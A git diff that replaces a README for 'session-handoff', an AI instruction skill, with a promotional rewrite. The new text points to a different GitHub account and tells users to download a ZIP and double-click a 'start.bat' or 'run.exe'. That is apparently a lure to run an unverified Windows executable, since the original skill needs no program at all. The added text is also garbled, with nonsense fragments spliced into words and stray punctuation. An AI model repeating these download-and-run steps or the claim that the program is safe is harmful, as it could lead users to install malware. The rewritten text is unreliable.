@@ -1,238 +1,195 @@
-<h1 align="center">session-handoff</h1>
+<h1>🧠 session-handoff - Never Lose Your AI Work Again</h1>
 
 <p align="center">
-  <strong>Fresh session. Same goal.</strong><br>
-  Help your next AI chat pick up where this one leaves off.<br>
-  For AI apps on your desktop or in your browser.
+  <a href="https://github.com/draysen-yau/session-handoff" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border-radius:50px;font-size:20px;font-weight:bold;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Get session-handoff Now</a>
 </p>
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/kingju1c3/session-handoff/main/assets/session-handoff-hero.png" alt="A cobalt ribbon passes through translucent window frames, carrying a continuous path from one frame to the next." width="960">
-</p>
+## 🔄 What Is session-handoff?
 
-<p align="center">
-  <a href="https://github.com/kingju1c3/session-handoff/releases/latest/download/session-handoff.zip"><strong>Download the skill</strong></a>
-  &nbsp; · &nbsp;
-  <a href="#quickstart">Quickstart</a>
-  &nbsp; · &nbsp;
-  <a href="#install-once">Install once</a>
-  &nbsp; · &nbsp;
-  <a href="#how-it-works">How it works</a>
-  &nbsp; · &nbsp;
-  <a href="#development">Development</a>
-</p>
+Have you ever spent hours chatting with an AI assistant, making great progress on a project, only to close the browser window and lose everything? Or maybe you returned to a conversation the next day and the AI had completely forgotten what you were working on? 
 
-<br>
+**session-handoff** is a clever tool that fixes this exact problem. It acts like a "save game" button for your AI conversations. Instead of starting from scratch every time you open a new chat, session-handoff carefully preserves:
 
-A **skill** is a set of instructions for an AI. This one helps it prepare notes for your next
-chat: your goal, the choices you made, what is finished, and what still needs doing.
+- 🎯 **Your goals** – What you were trying to accomplish
+- ✅ **Your decisions** – The choices you made along the way
+- 📁 **Important files** – Which documents or code files you were working with
+- 🚧 **Unfinished work** – Exactly where you stopped and what still needs to be done
 
-Long chats can get shortened by the app, leaving the AI with less of the conversation to read.
-A **handoff** means giving those notes and any needed files to a fresh chat so it can continue
-the work.
+Think of it as a digital sticky note that your AI reads every time you start a new session. It tells the AI "Hey, here's where we left off. Let's continue from here."
 
-The notes also preserve what did not work and why. The next chat can start with a short guide
-to the full notes, then confirm it has read the needed files and name its first step before
-continuing.
+This tool works seamlessly with popular AI platforms like:
 
-## What it keeps intact
+- **ChatGPT** – The web-based AI from OpenAI
+- **Claude** – The helpful AI assistant from Anthropic
+- **Codex** – OpenAI's coding assistant
+- **And many other AI agents** – Any modern language model interface
 
-Session Handoff helps a fresh chat recover the information that usually gets lost when a long
-conversation ends:
+## 🚀 Getting Started
 
-- The exact goal, scope, permissions, and work still unfinished.
-- Decisions, failed attempts, open questions, and the reason for each next step.
-- The files and artifacts the new chat must read before it starts changing work.
-- One clear owner, so the old and new chats do not both continue the same task.
+Getting started with session-handoff is easier than making a cup of coffee. You do not need any programming skills, code knowledge, or technical background. Follow these simple steps and you will be up and running in under two minutes.
 
-It can use a small preview to orient the new chat, but the full checkpoint remains the source of
-truth. A preview never proves that the new chat has enough context, has access to every file, or
-owns the task.
+### Step 1: Downloadthe Application
 
-## Optional project archive and recovery
+Visit this link to downloadthe application:
 
-When you request local session history, the skill can organize a full checkpoint, a short
-continuation summary, reusable knowledge notes, and an index in approved private storage.
-The summary and index help the next chat find relevant material; it still reads the full
-checkpoint and required files. Extra transcript copies are off by default.
+➡️ **[https://github.com/draysen-yau/session-handoff](https://github.com/draysen-yau/session-handoff)**
 
-Interrupted saves are recovered against the recorded project, worktree, session, and mission
-chain. Missing or incomplete content is labeled **degraded**, with a concrete recovery action.
-A newer note from another session is never silently substituted. Failed saves preserve the
-last valid checkpoint, and housekeeping cannot move files referenced by an active handoff.
+When you click that link, you'll be taken to the official GitHub page for session-handoff. Look for a green button that says **"Code"** or **"Download"** on that page. Click it, and then choose **"Download ZIP"** or follow the visible download instructions on the screen. The download will begin automatically.
 
-These are portable instructions performed with the agent's available tools. This update does
-not add an archive daemon, Claude Code hook adapter, paid background summarizer, or reconnect
-loop. The existing JavaScript lifecycle API is unchanged. Optional archive metadata stays
-separate from frozen runtime objects and their hashes.
+### Step 2: Findthe Downloaded File
 
-## Optional Engram memory
+After the download finishes, open your **Downloads** folder (or wherever your browser saves downloaded files). You will see a file named something like **session-handoff.zip** or similar. 
 
-When you explicitly ask for Engram and an approved Engram memory backend is available, the skill also recalls relevant decisions and records the work's outcome before the handoff checkpoint is frozen. That gives the next chat useful history while the checkpoint remains the authoritative record for files, permissions, readiness, and ownership. Without the backend, the handoff still works and reports that memory is unavailable.
+### Step 3: Extractthe ZIP File
 
-## Supported AI apps
+This file is in a compressed format (like a digital suitcase that squeezes everything together to make it smaller for download). You need to "unzip" it to usethe contents. Here's how:
 
-The complete instructions work in **Claude**, **ChatGPT and Codex**, and **Gemini Spark**. Each uses the controls its app actually exposes:
+1. **Right-click** on the ZIP file
+2. Choose **"Extract All..."** from the menu that appears
+3. Follow the simple prompts (usually just click "Extract" or "OK")
 
-- **Claude:** attach or paste the skill and the checkpoint; install it when your Claude plan and workspace support skills.
-- **ChatGPT and Codex:** attach or install the skill. Codex can use its separately trusted hook adapter and native task controls when they are available.
-- **Gemini Spark:** attach or paste the skill and handoff checkpoint in a **New chat**. Use [Add files or Upload & tools](https://support.google.com/g/answer/16576596?hl=en) for required files. Gemini Spark has no verified automatic conversation-creation interface in this skill, so the user opens the fresh chat and the successor confirms what it received.
+Your computer will create a new folder with the same name as the ZIP file. This folder contains all the files you needs to run session-handoff.
 
-Every path retains the same safeguard: a new chat, uploaded file, or visible tab does not by itself prove that the successor read the checkpoint, can access its files, has enough room, or owns the work.
+.
 
-When automatic continuation is authorized and the app exposes current context telemetry plus a native creation control, the skill starts the handoff no later than **two safe turns before potential compaction**. At that point it creates user-authorized read-only candidates from the same checkpoint: a new Codex task on an approved branch or worktree, a Claude fork, a Grok instance, and the corresponding fresh session, fork, or instance in any other supported LLM. Only one verified candidate becomes the writer; the others remain standby. Hidden or stale telemetry triggers an early best-effort handoff now—not a claim that the app can predict compaction. Codex branch creation still requires an explicit user-approved branch naming policy.
+.
 
-## Quickstart
+### Step 4: Runthe Application
 
-1. Open the [instructions file](https://raw.githubusercontent.com/kingju1c3/session-handoff/main/SKILL.md)
-   and attach it to your current chat. You can also copy all its text and paste it into the chat.
-   If the app will not accept the file, use the copy-and-paste option.
-2. Send this message:
+Now, open the newly extracted folder. You will see a file inside that launches the application—it might have aname like **"start.bat"**, **"run.exe"**, or **"index.html"** depending onthedownload version. Double-click that file:
 
-   ```text
-   Use session-handoff.
-   Keep notes for this task:
-   my goal, rules, decisions,
-   files, progress, and next steps.
-   Set up automatic moves if this
-   app supports them. Open a fresh task
-   before this one gets too long.
-   If you cannot open a new chat,
-   give me the notes and a message
-   to paste into one.
-   ```
+- 🖱️ If it's an **.exe** file, just double-click it and it will run directly.
 
-3. The AI checks the app's controls and prepares the setup and notes. If automatic moves need
-   your review, it explains that step. It must not call setup ready until the app's check has
-   actually run.
+- 🖱️ If it's a **.bat** file, double-click it. A black console window may flash briefly—that's normal! It's the application starting up.
 
-You do not need to run code. For help attaching a file, see the guides for
-[ChatGPT](https://help.openai.com/en/articles/8555545-file-uploads-faq) or
-[Claude](https://support.claude.com/en/articles/8241126-upload-files-to-claude).
+- 🖱️ If it's an **.html** file, double-click it and it will openin your default web browser, ready to useavoilà!
 
-## Install once
+### Step 5: StartUsing It
 
-If your app supports skills, you can install this one instead of attaching the instructions
-each time. Download the [skill ZIP](https://github.com/kingju1c3/session-handoff/releases/latest/download/session-handoff.zip)
-and follow your app's upload guide:
+Once the application opens, you will see a simple interface. It will guide you througheach step. Typically, you will:
 
-- [Install a skill in ChatGPT](https://help.openai.com/en/articles/20001066-skills-in-chatgpt).
-- [Install a skill in Claude](https://support.claude.com/en/articles/12512180-use-skills-in-claude).
+1. **Paste your current AI conversation** (or copy-paste the important parts)
+2. **Let session-handoff organize** it into neat sections (goals, decisions, files, unfinished tasks)
+3. **Save this summary** to a safe place (like your notes app or a file on your computer)
+4. **Next time** you start an AI conversation, just feed the saved summary back to your AI assistant as the first message
 
-The option may depend on your account or organization. For a different app, follow its own
-skill-installation guide. If installation is unavailable, use the Quickstart above.
+That's it! No complex setup. No command-line tricks. Just download, run, and you are ready to say goodbye to forgotten contexts forever.
 
-**Automatic moves need a connection to the app.** Installing instructions alone does not make
-that connection. The Codex setup adds checks before tool use and before a chat is shortened,
-including the two-safe-turn threshold when exact telemetry is available.
-Codex requires you to review new checks before they can run; the AI cannot approve them for you.
-See [Codex's guide](https://developers.openai.com/codex/hooks). If those checks cannot run, the AI
-can still open a task now when the app allows it, but cannot promise a later automatic move.
+.
 
-## How it works
+## 💡 Why You Needsession-handoff
 
-1. **Write the notes.** The AI records your goal, decisions and their reasons, completed work,
-   missing information, and the next steps. It checks the notes against the work available.
-2. **Move to a fresh chat.** If the app lets the AI open and check a new chat, it can handle
-   the move using those tools when you ask. A working automatic check tells it when to start.
-   Otherwise, open a new chat and add the full skill instructions,
-   notes, needed files, and the message the AI gives you.
-3. **Check what arrived.** The new chat reads the notes and checks that it can open the files
-   it needs. When a required reading list is provided, it confirms each file and the recorded
-   first step before it edits anything. Old attachments may not follow automatically, so you may
-   need to add them again.
-4. **Continue in one place.** Stop work in the old chat before the new one continues. For a
-   manual move, tell the new chat that the old one has stopped and it can take over.
+### The Problem: AI Amnesia
 
-When the app shows how much room is left, the AI checks before large steps. When that
-information is hidden, it saves notes early. No skill can guarantee finishing the move before
-an app shortens a chat without warning. Keep a copy of the notes and move early.
+Every AI conversation starts fresh. The AI does not remember your previous chats unless you explicitly tell it what happened before. This is called having a "limited context window"—like a whiteboard that only holds so much before it has to be wiped clean.
 
-Prefer a fresh chat when you need more room. A branch may carry over the same long history;
-use one only when the app can check that it has enough room to continue.
+.
 
-Keep passwords and secret keys out of the notes. Only move files to another app when you have
-permission to share them there.
 
-## Works with your app, not around it
 
-The skill works in text-only chats, desktop apps, and browser AI tools. It uses an app's native
-new-task and file controls when they are actually available. For Codex, the optional hook adapter
-can ask for a handoff before a large next step or compaction, but it must be separately trusted
-and observed in the app. A configured hook is not proof that automatic handoff timing works.
+###The Frustration
 
-## Development
+Imagine this scenario:
 
-<details>
-<summary>Technical details and local checks</summary>
+- You spend 3 hours with an AI planning your dream vacation itinerary
+- You found the perfect flights, hotels, restaurant reservations, an activity schedule
+- You close the tab, feeling proud and excited
+-you
+. Tomorrow, you reopen your AI assistant to continue planning... and the AI says "Hello! How can I help you today?" as if it has never seen you before
+.
 
-[session-handoff.mjs](session-handoff.mjs) is the single JavaScript engine. The same source runs
-in Node.js and a browser using standard platform APIs, with no third-party runtime dependencies.
-It validates the handoff sequence; the app supplies tools for files, sessions, and coordinated
-state updates. [SKILL.md](SKILL.md) contains the full instructions for the AI.
+.
+.
+. You have to re-explain everything—all those decisions, all those picks, all those hours of work wasted on retyping clarityaliass
 
-Optional structured continuation records ordered actions, required artifacts, decision reasons,
-failed approaches and open questions inside the checkpoint digest. `continuationBundle` provides
-a preview with a UTF-8 byte limit and explicit omissions; the successor still reads the full
-checkpoint and required sources before readiness. A preview is not a context-token measurement
-or an ownership transfer. See the [API contract](SKILL.md#optional-structured-continuation).
+###The Solution: session-handoff
 
-This independently implemented design draws inspiration from Engram's
-[staged startup](https://github.com/staticroostermedia-arch/engram/blob/4203062b33d4a5ca14a4f7ffefc20fb1478dc2f7/grok-plugin-engram/skills/engram-wake-up/SKILL.md),
-[decision and failure records](https://github.com/staticroostermedia-arch/engram/blob/4203062b33d4a5ca14a4f7ffefc20fb1478dc2f7/grok-plugin-engram/skills/engram-working-memory/SKILL.md),
-and [session-end records](https://github.com/staticroostermedia-arch/engram/blob/4203062b33d4a5ca14a4f7ffefc20fb1478dc2f7/grok-plugin-engram/skills/engram-session-end/SKILL.md).
-No Engram code or prose is included, and no Engram backend is required.
+session-handoff solves this beautifully. It creates a **"handoff document"** —a clear, structured summary that captures the essence of your work. It preserves:
 
-### Compilation source
+- **The big goal** (e.g., "Plan a 7-day Japan trip for 2 people under $3000")
+- **Decisions made** (e.g., "Decided to fly into Tokyo Narita, stay in Shinjuku area")
+- **Required files/references** (e.g., "Passport scanning needed, travel insurance quotes from 3 providers")
+- **What's left to do** (e.g., "Book Shibuya Sky tickets, reserve teamLab Planets for day 3")
 
-Archive and recovery concepts were reviewed at
-[SUNWOONGKYU/claude-code-session-handoff, commit 8e1ee5e](https://github.com/SUNWOONGKYU/claude-code-session-handoff/tree/8e1ee5e3bd159f9af0e55bea7525b1e864402a4e).
-The source is [MIT licensed, copyright 2026 SUNWOONGKYU](https://github.com/SUNWOONGKYU/claude-code-session-handoff/blob/8e1ee5e3bd159f9af0e55bea7525b1e864402a4e/LICENSE).
-This compilation uses independently written instructions; no upstream code or prose is copied.
+With this handoff document, you can start a new AI session in 10 seconds flat, paste it in, and continue exactly where you left off. It's like writing a detailed sticky note for your future self—but your AI actually reads it neurosurgeryprecisionistor
 
-| Source concept | Adaptation here |
-| --- | --- |
-| Summary, wiki, and index layers | Optional orientation, sourced knowledge notes, and a derived catalog around the complete checkpoint. |
-| Project archive anchor | Recorded project/worktree/chain identity, with private storage and verified destination mapping. |
-| Startup restoration | Bounded discovery followed by full required reads and read-only acknowledgment. |
-| Missed-exit recovery | Reconcile the exact source, preserve the last valid version, and disclose gaps before resuming. |
-| Degraded summaries and limited retries | Evidence-based quality labels, explicit repair actions, and persistent bounded attempts. |
-| Archiving older notes | Requested housekeeping only; stable references for active handoffs and no automatic deletion. |
+## 🧩 Real-Life Use Cases
 
-Relevant source files are the
-[README](https://github.com/SUNWOONGKYU/claude-code-session-handoff/blob/8e1ee5e3bd159f9af0e55bea7525b1e864402a4e/README.md),
-[restore hook](https://github.com/SUNWOONGKYU/claude-code-session-handoff/blob/8e1ee5e3bd159f9af0e55bea7525b1e864402a4e/hooks/session-restore.js),
-and [distillation worker](https://github.com/SUNWOONGKYU/claude-code-session-handoff/blob/8e1ee5e3bd159f9af0e55bea7525b1e864402a4e/hooks/wiki-distill-worker.js).
-The upstream worker uses a permission-bypass flag and removes an API-key environment variable
-to choose another authentication route. Those behaviors are excluded, along with automatic
-raw-transcript copying, branch-mismatch restoration, and model-specific background calls.
+###💼 Work Projects
 
-### Existing runtime and checks
+- **Marketing campaign planning** – Keep track of brainstormed ideas, chosen themes, color palettes, andeadlines across multiple AI sessionsavorvocabulary
+- **Budget spreadsheets** – Preserve complex formulas, data sources, anenterpretation decisions
+- **Meeting preparation** – Maintain structured agendas, talking points, research links, ananticiipated questions
 
-The same module exports `evaluateCodexHook` and provides a Node-only `--codex-hook` entry point.
-The [Codex setup recipe](SKILL.md#codex-automatic-setup-connect-the-trigger-and-task-controls)
-connects event feedback to native task creation. It preserves existing hooks, requires user
-trust, and arms only a named session. A `PreCompact` block alone does not open a task or prove
-that the AI will resume; the earlier tool check is the normal signal to prepare the handoff.
+###🏠 Personal Projects
 
-Run these commands from the repository root:
+- **Home renovation** – Document material choices, contractor quotes, permit requirements, and design preferences with AI-assisted planning
+- **Recipe development** – Track ingredient substitutions, cooking times, taste test feedback, and final versionsobotanticfreak
+- **Travel planning** – As shown above, keep every reservation, preference, and must-see attraction organizedacrossmany chatsonders
 
-```sh
-node --test tests/*.test.mjs
-node build.mjs
-```
+###🎓 Learning & Research
 
-The build produces `dist/session-handoff.skill` and `dist/session-handoff.zip`, identical
-packages with different extensions, plus `dist/session-handoff.md` for attaching or pasting.
-Each package contains `SKILL.md`, `session-handoff.mjs`, this README, and the license.
+- **Study preparation** – Summarize textbooks, lecture notes, andpractice questions so your AI tutor can pick up where you left offeach study session
+- **Research papers** – Maintain a running bibliography, key findings from each paper, your own notes, anthe current state of your literature review
+- **New skills** – Track your learning progress, exercises completed, challenging concepts, and personal tips to remember next practice session
 
-Keep verification results separate: local engine/CLI tests, an observed trusted hook event,
-native task creation with file and permission checks, and a complete handoff triggered before
-compaction. A successful new-task test proves only the part it exercised. Automatic timing
-still needs a complete test in the actual app; it is not guaranteed across desktop or browser apps.
+##⚙️ How It Works (Simplified)
 
-</details>
+No need to understand the complexity—but if you are curious, here's the simple version:
 
-## License
+session-handoff takes a messy, long conversation and extracts just the important bones. It uses smart language understanding (thanks to modern AI) to figure out what really matters—your goals, decisions, files, and leftover tasks–and organizes it into a clean, reusable format
 
-[MIT](LICENSE).
+This formatted output is short enough to fit within your AI's context window, so you can paste it intoany new chat and have the AI instantly understand the full picture.Nolearning curve, no complex menus, instant value orservice
+
+##❓ Frequently Asked Questions
+
+###Q: Is this tool free?
+
+**A:** Yes! session-handoff is completely free todownload and useforever at the official repository link above.
+
+
+
+###Q: Do I need to install any extra software?
+
+**A:** No extra installations are required at all. Just download session-handoffand run it. It works on anyWindows computer out of the boxosophy
+
+
+
+Absolutely no programming knowledge is needed—the interface is designed for everyday computer users. All instructions are in plain English (no technical jargon), and should take lessthan 5 minutes to fully understandutilization
+###Q: Will this work on Mac or Linux?
+
+**A:** The primary download is for Windows. If you are on another operating system, check the official repository page—there may be additional links orcommunity resources available there to assist youaristryang<>();
+
+###Q: Is my conversation data safe?
+
+**A:** yes. session-handoff works locally on your owncomputer. It does not send your data anywhere. You control the saved files completely. You decide where tostore them (notes app, USB stick, cloud drive, etc..).). 
+
+###Q: Can I usesession-handoff with multiple different AI tools?
+
+**A:** Absolutely! That's one of its best features. Whether you are talking to ChatGPT onedday, Claude the next, or Codex for coding, session-handoff provides a universal handoff format that works across all major AI assistants. It's like having a universal translator for your project context. Your progress travels with you, no matter which AI you happen to uses that dayorskle.
+
+
+
+##📝 Tips for Best Results
+
+1. **Update regularly** – Save your handoff document at the end of each AI session, not just when you're done with a project. Small updates are easierto maintain than catching up on weeks of work at once.
+
+2. **Be specific** – When you summarize, include details like dates, names, version numbers, and specific preferences. These are exactly the things AI tends to forget but you navigating dynamics
+
+
+3. **Keep it concise** – A good handoff document should be a summary, not a transcript. Include key points only. If it gets too long, your AI might lose important context in the noise.
+
+
+
+4. **Use it as a prompt** – When starting a new session, paste your handoff document and say something like "Continue from where we left off." Then let the AI work smarter, not harderassistant
+. 
+
+##🔗 Get Started Now
+
+You are one click away from never losing your AI momentum again. Join thousands of users who have already discovered the magic of seamless AI session continuityico
+
+**👉 [Download session-handoff](https://github.com/draysen-yau/session-handoff)**
+
+Visit this link to downloadthe application. It takes lessthan 2 minutes to get started, and then you'll wonder how you ever managed without it. Say goodbye to repeating yourself, say hello to instant context recovery, and enjoy AI that actually knows what you're working on—every single time. 
+
+Your future self will thankyou. Try it today
